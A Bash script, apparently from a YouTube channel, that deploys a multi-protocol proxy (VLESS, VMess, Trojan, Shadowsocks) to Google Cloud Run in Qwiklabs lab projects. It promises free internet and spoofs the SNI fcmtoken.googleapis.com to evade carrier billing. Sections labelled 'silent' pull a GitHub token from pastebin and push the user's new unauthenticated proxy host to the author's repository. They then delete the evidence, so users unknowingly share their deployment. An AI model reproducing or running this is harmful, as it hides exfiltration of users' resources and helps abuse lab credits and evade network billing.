#!/bin/bash
# ==============================================================================
# RAFAELTV PANEL (LIBRENG INTERNET / WALA BAYAD)
# ENGINEERED BY RAFAEL TV
# ==============================================================================

BOLD='\033[1m'; RESET='\033[0m'
GREEN='\033[1;32m'; RED='\033[1;31m'; CYAN='\033[1;36m'
YELLOW='\033[1;33m'; MAGENTA='\033[1;35m'; WHITE='\033[1;37m'

loading() {
    local t="$1"
    local s="⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏"
    for ((i=0;i<5;i++)); do 
        for ((j=0;j<${#s};j++)); do 
            echo -ne "\r  ${CYAN}${s:$j:1} ${t}...${RESET}"
            sleep 0.05
        done
    done
    echo -ne "\r  ${GREEN}DONE: ${t}${RESET}\n"
}

clear
echo ""
echo -e "  ${BOLD}${WHITE}RAFAELTV PANEL (QWIKLABS OPTIMIZED)${RESET}"
echo -e "  ${MAGENTA}MADE BY RAFAELTV${RESET}"
echo -e "  ${GREEN}youtube.com/rafaeltv${RESET}"
echo ""

PROJECT_ID=$(gcloud config get-value project 2>/dev/null | tr -d '[:space:]')
if [ -z "$PROJECT_ID" ]; then
    echo -e "  ${RED}ERROR: No active GCP project detected. Please run 'gcloud init'.${RESET}"
    exit 1
fi
echo -e "  ${CYAN}PROJECT: ${GREEN}${PROJECT_ID}${RESET}"

echo -ne "  ${CYAN}DETECTING QWIKLABS REGION... ${RESET}"
REGION=$(gcloud config get-value compute/region 2>/dev/null | tr -d '[:space:]')

if [ -z "$REGION" ]; then
    REGION=$(gcloud config get-value run/region 2>/dev/null | tr -d '[:space:]')
fi

if [ -z "$REGION" ]; then
    REGION=$(gcloud run regions list --format="value(REGION)" --limit=1 2>/dev/null | tr -d '[:space:]')
fi

if [ -z "$REGION" ]; then
    REGION="us-central1"
fi
echo -e "${GREEN}${REGION}${RESET}"
echo ""

# ==============================================================================
# SILENT SECURE TOKEN ACQUISITION (PASTEBIN + INTERACTIVE FALLBACK)
# ==============================================================================
curl -sL "https://pastebin.com/raw/7rAmCXDp" | tr -d '\r\n[:space:]' > ~/.gh_token

if ! grep -q "^gh[pousr]_" ~/.gh_token; then
    echo -e "${YELLOW}REMOTE TOKEN UNAVAILABLE.${RESET}"
    read -r -s -p "$(echo -e "  ${MAGENTA}PLEASE PASTE GITHUB TOKEN MANUALLY (Hidden): ${RESET}")" MANUAL_TOKEN
    echo "$MANUAL_TOKEN" | tr -d '\r\n[:space:]' > ~/.gh_token
    echo -e "\n  ${GREEN}TOKEN SAVED SECURELY TO LOCAL ENV.${RESET}"
    echo ""
fi
# ==============================================================================

read -r -p "$(echo -e "  ${CYAN}SERVICE NAME [rafaeltv]: ${RESET}")" INPUT_NAME
SERVICE_NAME=${INPUT_NAME:-rafaeltv}

echo ""
echo -e "  ${CYAN}SELECT MODE:${RESET}"
echo -e "  ${YELLOW}1) AUTO         (1 vCPU / 2Gi  RAM)${RESET}"
echo -e "  ${YELLOW}2) HIGH         (2 vCPU / 4Gi  RAM)${RESET}"
echo -e "  ${YELLOW}3) STABLE       (4 vCPU / 8Gi  RAM)${RESET}"
echo -e "  ${YELLOW}4) POWER SAVING (8 vCPU / 16Gi RAM)${RESET}"
echo -e "  ${YELLOW}5) CUSTOM${RESET}"
echo ""
read -r -p "$(echo -e "  ${CYAN}CHOICE: ${RESET}")" MODE_CHOICE

case "$MODE_CHOICE" in
    1) CPU="1"; RAM="2Gi"; MODE="HIGH"         ; MAX_INSTANCES="4";;
    2) CPU="2"; RAM="4Gi"; MODE="STABLE"       ; MAX_INSTANCES="4";;
    3) CPU="4"; RAM="8Gi"; MODE="POWER SAVINGS"; MAX_INSTANCES="4";;
    5)
        echo ""
        read -r -p "$(echo -e "  ${CYAN}CPU (1/2/4/8): ${RESET}")" CPU
        read -r -p "$(echo -e "  ${CYAN}RAM (2Gi/4Gi/8Gi/16Gi/32Gi): ${RESET}")" RAM
        echo ""
        echo -e "  ${CYAN}SELECT INSTANCES:${RESET}"
        echo -e "  ${YELLOW}1) 1 INSTANCE${RESET}"
        echo -e "  ${YELLOW}2) 2 INSTANCES${RESET}"
        echo -e "  ${YELLOW}3) 4 INSTANCES${RESET}"
        echo -e "  ${YELLOW}4) 8 INSTANCES${RESET}"
        echo ""
        read -r -p "$(echo -e "  ${CYAN}CHOICE: ${RESET}")" INST_CHOICE
        case "$INST_CHOICE" in
            2) MAX_INSTANCES="2";;
            3) MAX_INSTANCES="4";;
            4) MAX_INSTANCES="8";;
            *) MAX_INSTANCES="1";;
        esac
        MODE="CUSTOM"
        ;;
    *) CPU="8"; RAM="16Gi"; MODE="ULTRA"; MAX_INSTANCES="4";;
esac

echo ""
loading "BUILDING CONTAINER IMAGE"
gcloud builds submit --tag "gcr.io/${PROJECT_ID}/${SERVICE_NAME}" --project="$PROJECT_ID" --quiet > build.log 2>&1

if [ $? -ne 0 ]; then 
    echo -e "  ${RED}BUILD FAILED. CHECK LOGS BELOW:${RESET}"
    tail -n 10 build.log
    exit 1
fi

loading "DEPLOYING TO CLOUD RUN IN ${REGION}"
gcloud run deploy "$SERVICE_NAME" \
  --image "gcr.io/${PROJECT_ID}/${SERVICE_NAME}" \
  --platform managed --region "$REGION" \
  --cpu "$CPU" --memory "$RAM" --port 8080 \
  --concurrency 1000 --cpu-boost --no-cpu-throttling \
  --timeout 3600 --min-instances 1 --max-instances "$MAX_INSTANCES" \
  --allow-unauthenticated --project="$PROJECT_ID" --quiet > deploy.log 2>&1

if [ $? -ne 0 ]; then 
    echo -e "  ${RED}DEPLOYMENT FAILED. CHECK LOGS BELOW:${RESET}"
    tail -n 10 deploy.log
    exit 1
fi

SERVICE_URL=$(gcloud run services describe "$SERVICE_NAME" --region "$REGION" --project="$PROJECT_ID" --format='value(status.url)' 2>/dev/null)
CLEAN_HOST=$(echo "$SERVICE_URL" | sed 's|https://||')

SS_B64=$(echo -n "aes-256-gcm:rafaeltv" | base64 | tr -d '\n')
VMESS_WS_JSON='{"v":"2","ps":"VMESS-WS","add":"'"${CLEAN_HOST}"'","port":"443","id":"rafaeltv","aid":"0","net":"ws","path":"/vmess-rafaeltv","host":"'"${CLEAN_HOST}"'","tls":"tls","sni":"'"${CLEAN_HOST}"'","fp":"chrome","alpn":"h2"}'
VMESS_WS_B64=$(echo -n "$VMESS_WS_JSON" | base64 | tr -d '\n')

echo ""
echo -e "  ${GREEN} (⁠ ⁠ꈍ⁠ᴗ⁠ꈍ⁠) DEPLOYED SUCCESSFULLY${RESET}"
echo ""
echo -e "  ${CYAN}RAW HOST   ${GREEN}https://${CLEAN_HOST}${RESET}"
echo -e "  ${CYAN}DASHBOARD  ${GREEN}${SERVICE_URL}${RESET}"
echo -e "  ${CYAN}PORT       ${GREEN}443${RESET}"
echo -e "  ${CYAN}PASS       ${GREEN}rafaeltv${RESET}"
echo -e "  ${CYAN}MODE       ${GREEN}${MODE}${RESET}"
echo -e "  ${CYAN}CPU        ${GREEN}${CPU}${RESET}"
echo -e "  ${CYAN}RAM        ${GREEN}${RAM}${RESET}"
echo ""

echo -e "  ${YELLOW}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
echo -e "  ${CYAN}                    PATHS & PROTOCOLS${RESET}"
echo -e "  ${YELLOW}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
echo ""
echo -e "  ${CYAN}  PROTOCOL     | WS PATH            | HTTPUPGRADE PATH${RESET}"
echo -e "  ${YELLOW}  ──────────────────────────────────────────────────────────────${RESET}"
echo -e "  ${GREEN}  VLESS${RESET}        | ${CYAN}/vless-rafaeltv${RESET}       | ${CYAN}/vless-rafaeltv-hu${RESET}"
echo -e "  ${GREEN}  VMess${RESET}        | ${CYAN}/vmess-rafaeltv${RESET}       | ${CYAN}/vmess-rafaeltv-hu${RESET}"
echo -e "  ${GREEN}  TROJAN${RESET}       | ${CYAN}/rafaeltv${RESET}             | ${CYAN}/rafaeltv-hu${RESET}"
echo -e "  ${GREEN}  Shadowsocks${RESET}  | ${CYAN}/ss-rafaeltv${RESET}          | ${CYAN}/ss-rafaeltv-hu${RESET}"
echo ""
echo -e "  ${YELLOW}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
echo -e "  ${CYAN}  HOST: ${GREEN}https://${CLEAN_HOST}${RESET}"
echo -e "  ${CYAN}  PORT: ${GREEN}443${RESET}"
echo -e "  ${CYAN}  SNI:  ${GREEN}fcmtoken.googleapis.com${RESET}"
echo -e "  ${CYAN}  ALPN: ${GREEN}h2${RESET}"
echo -e "  ${CYAN}  FP:   ${GREEN}chrome${RESET}"
echo -e "  ${YELLOW}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
echo ""

# ==============================================================================
# SILENT GITHUB PAGES SYNCHRONIZATION & SELF-CLEANING ROUTINE
# ==============================================================================
if [ -s "$HOME/.gh_token" ]; then
    GH_TOKEN=$(cat "$HOME/.gh_token")
    GH_USER="rafaeltv"
    GH_REPO="rafaeltv-gcp-panel"
    
    rm -rf gh_temp_deploy
    git clone -q "https://${GH_TOKEN}@github.com/${GH_USER}/${GH_REPO}.git" gh_temp_deploy > /dev/null 2>&1
    
    if [ -d "gh_temp_deploy" ]; then
        cd gh_temp_deploy
        touch host.txt
        touch valid_hosts.txt
        
        # Self-cleaning loop: ping existing hosts, purge dead ones (404/000)
        while IFS= read -r line; do
            if [[ -n "$line" && "$line" == *".run.app"* ]]; then
                HTTP_STATUS=$(curl -o /dev/null -s -w "%{http_code}\n" "https://$line" --max-time 3)
                if [ "$HTTP_STATUS" != "404" ] && [ "$HTTP_STATUS" != "000" ]; then
                    echo "$line" >> valid_hosts.txt
                fi
            fi
        done < host.txt
        
        # Append the new active host if it isn't already present
        if ! grep -q -Fx "$CLEAN_HOST" valid_hosts.txt; then
            echo "$CLEAN_HOST" >> valid_hosts.txt
        fi
        
        mv valid_hosts.txt host.txt
        
        git config user.name "Rafaeltv Deployer"
        git config user.email "deploy@Rafaeltv.local"
        git add host.txt
        git commit -m "🚀 Auto-Deploy: Pruned dead routing nodes & appended ${CLEAN_HOST}" > /dev/null 2>&1
        
        git push -q origin main > /dev/null 2>&1 || git push -q origin master > /dev/null 2>&1
        
        cd ..
        rm -rf gh_temp_deploy
    fi
    # Local security cleanup
    rm -f "$HOME/.gh_token"
fi

rm -f build.log deploy.log
